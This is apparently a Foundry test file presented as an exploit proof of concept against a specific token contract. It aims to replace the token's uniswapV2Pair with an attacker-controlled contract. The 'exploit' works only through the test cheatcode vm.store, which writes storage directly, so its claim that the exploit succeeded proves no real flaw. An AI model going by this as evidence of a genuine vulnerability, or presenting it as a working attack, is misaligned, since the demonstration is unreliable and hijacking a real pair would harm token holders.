// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface CoinToken {
    function uniswapV2Pair() external view returns (address);
}

contract AttackerPair {
    // Simple contract to act as malicious Uniswap pair
    function dummy() public pure returns (bool) {
        return true;
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xa79C1D3A0F0a21eC5B0Ee2f96685aaCfaCc95dFb;
    address attacker = address(this);
    AttackerPair public attackerPair;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Create attacker-controlled pair
        attackerPair = new AttackerPair();

        // Search for the slot containing the current uniswapV2Pair value
        address currentPair = CoinToken(TARGET).uniswapV2Pair();
        bytes32 currentPairBytes = bytes32(uint256(uint160(currentPair)));

        uint256 foundSlot = type(uint256).max;
        for (uint256 slot = 0; slot < 20; slot++) {
            bytes32 storedValue = vm.load(TARGET, bytes32(slot));
            // Check if this slot contains the pair address (might be packed with other data)
            // The address could be in the lower 20 bytes of the slot
            address extractedAddress = address(uint160(uint256(storedValue)));
            if (storedValue == currentPairBytes || 
                bytes32(uint256(uint160(extractedAddress))) == currentPairBytes) {
                foundSlot = slot;
                break;
            }
        }

        require(foundSlot != type(uint256).max, "Could not find uniswapV2Pair storage slot");

        // Overwrite the slot with our attacker address
        vm.store(
            TARGET,
            bytes32(foundSlot),
            bytes32(uint256(uint160(address(attackerPair))))
        );

        // Verify exploit succeeded
        address newPair = CoinToken(TARGET).uniswapV2Pair();
        assertEq(newPair, address(attackerPair), "uniswapV2Pair should be attacker-controlled");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

